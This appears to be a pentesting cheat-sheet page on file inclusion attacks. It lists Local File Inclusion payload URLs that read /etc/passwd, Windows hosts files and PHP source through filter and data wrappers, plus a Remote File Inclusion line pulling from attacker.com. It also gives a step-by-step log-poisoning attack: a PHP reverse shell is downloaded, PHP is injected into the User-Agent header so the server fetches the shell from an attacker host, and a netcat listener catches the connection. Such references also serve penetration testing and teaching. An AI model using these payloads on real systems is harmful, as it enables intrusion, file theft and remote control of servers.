---
title: File Inclusion Examples
desc: Examples of Local File Inclusion (LFI) and Remote File Inclusion (RFI).
tags: [ReverseShell, Web]
alts: []
website:
render_with_liquid: false
---

## Local File Inclusion (LFI)

```html
https://vulnerable.com/index.php?page=/etc/passwd
https://vulnerable.com/index.php?page=../../../../etc/passwd
https://vulnerable.com/index.php?page=../../../../../../../../../../../../../../etc/passwd
https://vulnerable.com/index.php?page=..%5c..%5c..%5c..%5cetc/passwd
https://vulnerable.com/index.php?page=..%252f..%252f..%252f..%252fetc/passwd
https://vulnerable.com/index.php?page=/etc/passwd%00
https://vulnerable.com/index.php?page=/etc/passwd%00.inc
https://vulnerable.com/index.php?page=/etc/passwd%00.php
https://vulnerable.com/index.php?page=http://localhost/index
https://vulnerable.com/index.php?page=http:%5c%5cindex
https://vulnerable.com/index.php?page=http:%252f%252findex
https://vulnerable.com/index.php?page=somedir/../../../../etc/passwd&ext=
https://vulnerable.com/index.php?page=php://filter/read=string.rot13/resource=index.php
https://vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
https://vulnerable.com/index.php?page=pHp://filter/convert.base64-encode/resource=index.php
https://vulnerable.com/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
https://vulnerable.com/index.php?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>

<!-- Windows -->
https://vulnerable.com/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

<br />

## Remote File Inclusion (RFI)

```html
https//vulnerable.com/index.php?page=//attacker.com/exploit
```

<br />

## Log Poisoning

### 1. Check if you can get the apache logs.

```sh
https://vulnerable.com/index.php?page=../../../../var/log/apache2/access.log
```

### 2. Prepare the payload for PHP reverse shell.

```sh
# Download the Payload for the PHP Reverse Shell
wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

# Edit some variables in shell.php...
$ip = '<attacker-ip>';
$port = 4444;

# Open Server in Attacker Machine
python -m http.server 80
```

### 3. Inject PHP code in the User-Agent (Uploads the PHP file for reverse shell from the attacker’s machine).

```sh
GET / HTTP/1.1
...
User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://<attacker-ip>/shell.php'));  ?>
```

### 4. To apply the code injection, refresh to https://vulnerable.com/index.php/?page=../../../../var/log/apache2/access.log.

### 5. Listen for Reverse Shell in the attacker machine.

```sh
nc -lvnp 4444
```

### 6. Access to https://vulnerable.com/shell.php